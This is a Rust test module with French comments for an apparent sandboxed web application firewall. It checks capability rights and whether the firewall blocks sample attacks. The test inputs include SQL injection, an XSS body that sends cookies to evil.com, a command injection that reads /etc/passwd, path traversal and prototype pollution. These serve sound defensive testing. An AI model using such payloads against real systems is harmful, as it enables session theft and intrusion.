//! Module de validation du Pare-Feu Applicatif L7 (WAF) Sandboxed (`jambo-waf`)
//! Phase 114 — Jalon v0.2.112
#![allow(unused_imports, dead_code)]

extern crate alloc;

use crate::kprintln;
use jambo_abi::{Handle, SysError};
use jambo_waf::{
    waf_rights, AttackType, HttpMethod, HttpRequest, HttpResponse, JamboWafDaemon, RuleAction,
    RuleSeverity, TargetScope, WafCap, WafDecision, WafError, WafRule, ANOMALY_THRESHOLD,
};

/// Exécute la suite complète de validation formelle du WAF applicatif L7 (Phase 114)
pub fn execute_waf_daemon_test() -> bool {
    kprintln!(
        "[WAF/TEST] Démarrage du test de validation du Pare-Feu Applicatif L7 Sandboxed (Phase 114)..."
    );

    // 1. Contrôle d'accès capabilaire (WafCap) et atténuation monotone
    let admin_cap = WafCap::new(Handle::new(11401, 1), waf_rights::ALL, 1000, 1);
    assert!(admin_cap.is_valid());
    assert!(admin_cap.has_right(waf_rights::INSPECT_REQUEST));
    assert!(admin_cap.has_right(waf_rights::INSPECT_RESPONSE));
    assert!(admin_cap.has_right(waf_rights::ENFORCE_RULES));
    assert!(admin_cap.has_right(waf_rights::CONFIGURE_RULES));
    assert!(admin_cap.has_right(waf_rights::QUARANTINE_IP));
    assert!(admin_cap.has_right(waf_rights::WHITELIST_BYPASS));
    assert!(admin_cap.has_right(waf_rights::AUDIT_INSPECT));
    assert!(admin_cap.has_right(waf_rights::ADMIN));

    let attenuated = admin_cap
        .attenuate(
            waf_rights::INSPECT_REQUEST
                | waf_rights::INSPECT_RESPONSE
                | waf_rights::AUDIT_INSPECT,
            500,
        )
        .expect("Atténuation monotone WafCap");
    assert!(attenuated.has_right(waf_rights::INSPECT_REQUEST));
    assert!(attenuated.has_right(waf_rights::INSPECT_RESPONSE));
    assert!(attenuated.has_right(waf_rights::AUDIT_INSPECT));
    assert!(!attenuated.has_right(waf_rights::CONFIGURE_RULES));
    assert!(!attenuated.has_right(waf_rights::ADMIN));
    assert_eq!(attenuated.max_inspections, 500);

    // Rejet formel de toute amplification de privilèges ou d'augmentation de quota
    assert_eq!(
        attenuated.attenuate(waf_rights::ALL, 500),
        Err(WafError::PermissionDenied),
        "Amplification de droits formellement rejetée"
    );
    assert_eq!(
        attenuated.attenuate(waf_rights::INSPECT_REQUEST, 600),
        Err(WafError::PermissionDenied),
        "Augmentation du quota d'inspections formellement rejetée"
    );
    kprintln!("  [OK] Contrôle d'accès capabilaire et atténuation monotone WafCap");

    // 2. Initialisation du démon et des règles de sécurité OWASP Top 10
    let mut waf = JamboWafDaemon::new(admin_cap);
    waf.init_defaults();
    assert!(waf.rule_count >= 10, "Règles standard OWASP initialisées");
    kprintln!("  [OK] Initialisation du moteur WAF et règles OWASP Top 10 ({})", waf.rule_count);

    // 3. Inspection d'une requête HTTP légitime (Autorisation normale)
    let mut req_clean = HttpRequest::new([192, 168, 1, 42], HttpMethod::Get, "/api/v1/health");
    req_clean.add_header("Host", "jambo.cloud").expect("Header");
    req_clean.add_header("User-Agent", "JamboClient/1.0").expect("Header");
    let dec_clean = waf.inspect_request(&admin_cap, &req_clean, 1000).expect("Inspect Clean");
    assert_eq!(dec_clean, WafDecision::Allow, "Requête propre autorisée");
    assert_eq!(waf.total_passed, 1);
    kprintln!("  [OK] Inspection de requête légitime autorisée (Allow)");

    // 4. Détection et blocage d'injection SQL (SQLi Tautology)
    let req_sqli = HttpRequest::new(
        [10, 0, 1, 50],
        HttpMethod::Get,
        "/login?user=admin'%20or%20'1'='1",
    );
    let dec_sqli = waf.inspect_request(&admin_cap, &req_sqli, 1001).expect("Inspect SQLi");
    match dec_sqli {
        WafDecision::Block { attack_type, .. } => {
            assert_eq!(attack_type, AttackType::SqlInjection);
        }
        _ => panic!("Échec de détection de l'injection SQL"),
    }
    kprintln!("  [OK] Détection heuristique et blocage d'injection SQL (SQLi)");

    // 5. Détection et blocage de Cross-Site Scripting (XSS) dans le corps
    let mut req_xss = HttpRequest::new([10, 0, 1, 51], HttpMethod::Post, "/api/feedback");
    req_xss
        .set_body(b"<script>fetch('http://evil.com/steal?c='+document.cookie)</script>")
        .expect("Set Body");
    let dec_xss = waf.inspect_request(&admin_cap, &req_xss, 1002).expect("Inspect XSS");
    match dec_xss {
        WafDecision::Block { attack_type, .. } => {
            assert_eq!(attack_type, AttackType::CrossSiteScripting);
        }
        _ => panic!("Échec de détection du Cross-Site Scripting (XSS)"),
    }
    kprintln!("  [OK] Détection et blocage de Cross-Site Scripting (XSS)");

    // 6. Détection d'Exécution de Commandes (RCE) et Quarantaine automatique
    let mut req_rce = HttpRequest::new([198, 51, 100, 77], HttpMethod::Post, "/cgi-bin/test");
    req_rce.set_body(b"action=ping; cat /etc/passwd").expect("Set Body");
    let dec_rce = waf.inspect_request(&admin_cap, &req_rce, 1003).expect("Inspect RCE");
    match dec_rce {
        WafDecision::Quarantine { client_ip, reason, .. } => {
            assert_eq!(client_ip, [198, 51, 100, 77]);
            assert_eq!(reason, AttackType::CommandInjection);
        }
        _ => panic!("Échec de mise en quarantaine suite à injection RCE"),
    }
    assert!(waf.is_ip_quarantined(&[198, 51, 100, 77]));
    kprintln!("  [OK] Détection RCE critique et déclenchement de quarantaine O(1)");

    // 7. Détection de Traversée de Répertoires (Path Traversal)
    let req_traversal = HttpRequest::new(
        [10, 0, 1, 52],
        HttpMethod::Get,
        "/download?file=../../../../root/jambo-os/Cargo.toml",
    );
    let dec_traversal = waf
        .inspect_request(&admin_cap, &req_traversal, 1004)
        .expect("Inspect Traversal");
    match dec_traversal {
        WafDecision::Block { attack_type, .. } => {
            assert_eq!(attack_type, AttackType::PathTraversal);
        }
        _ => panic!("Échec de détection de traversée de répertoires"),
    }
    kprintln!("  [OK] Détection et blocage de traversée de répertoires (Path Traversal)");

    // 8. Détection de Pollution de Prototype JSON
    let mut req_proto = HttpRequest::new([10, 0, 1, 53], HttpMethod::Post, "/api/v1/user/patch");
    req_proto.add_header("Content-Type", "application/json").expect("Hdr");
    req_proto
        .set_body(b"{\"__proto__\": {\"isAdmin\": true}}")
        .expect("Body");
    let dec_proto = waf
        .inspect_request(&admin_cap, &req_proto, 1005)
        .expect("Inspect JSON");
    match dec_proto {
        WafDecision::Block { attack_type, .. } => {
            assert_eq!(attack_type, AttackType::PrototypePollution);
        }
        _ => panic!("Échec de détection de pollution de prototype JSON"),
    }
    kprintln!("  [OK] Analyseur JSON et protection contre la pollution de prototype");

    // 9. Inspection et filtrage de bytecode WebAssembly (Wasm)
    let mut req_wasm = HttpRequest::new([10, 0, 1, 54], HttpMethod::Post, "/wasm/module");
    let malformed_wasm: [u8; 16] = [
        0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00, // Magic + Version
        0x02, 0x07, b's', b'y', b's', b't', b'e', b'm', // Section 2 (Import interdit 'system')
    ];
    req_wasm.set_body(&malformed_wasm).expect("Body");
    let dec_wasm = waf
        .inspect_request(&admin_cap, &req_wasm, 1006)
        .expect("Inspect Wasm");
    match dec_wasm {
        WafDecision::Block { attack_type, .. } | WafDecision::Quarantine { reason: attack_type, .. } => {
            assert_eq!(attack_type, AttackType::MalformedWasm);
        }
        _ => panic!("Échec de validation de bytecode Wasm"),
    }
    kprintln!("  [OK] Filtrage sandboxed de bytecode WebAssembly (Wasm)");

    // 10. Prévention de Fuite de Données Sortantes (Data Leakage Prevention)
    let mut resp_leak = HttpResponse::new(200);
    resp_leak
        .set_body(b"Server Exception: -----BEGIN RSA PRIVATE KEY-----\nMIIEow...")
        .expect("Body");
    let resp_safe = waf
        .inspect_response(&admin_cap, &resp_leak, 1007)
        .expect("Inspect Response");
    assert!(!resp_safe, "Fuite de clé privée bloquée");
    kprintln!("  [OK] Interception sortante de fuite de données sensibles (Data Leakage)");

    // 11. Contournement par Liste Blanche (Whitelist Bypass)
    let trusted_admin_ip = [127, 0, 0, 1];
    waf.whitelist_ip(&admin_cap, trusted_admin_ip).expect("Whitelist");
    let req_trusted = HttpRequest::new(
        trusted_admin_ip,
        HttpMethod::Get,
        "/admin/audit?q=' or '1'='1",
    );
    let dec_trusted = waf
        .inspect_request(&admin_cap, &req_trusted, 1008)
        .expect("Inspect Trusted");
    assert_eq!(dec_trusted, WafDecision::Allow, "IP blanche autorisée sans blocage");
    kprintln!("  [OK] Contournement souverain par liste blanche (Whitelist Bypass)");

    // 12. Intégrité de la chaîne cryptographique d'audit SHA-256
    assert_ne!(waf.audit_chain, JamboWafDaemon::GENESIS_HASH);
    assert!(waf.audit_count >= 5);
    kprintln!("  [OK] Chaîne d'audit cryptographique SHA-256 inaltérable (Entrées: {})", waf.audit_count);

    kprintln!("[WAF/TEST] Tous les contrôles du Pare-Feu Applicatif L7 Sandboxed (Phase 114) ont RÉUSSI avec succès.");
    true
}
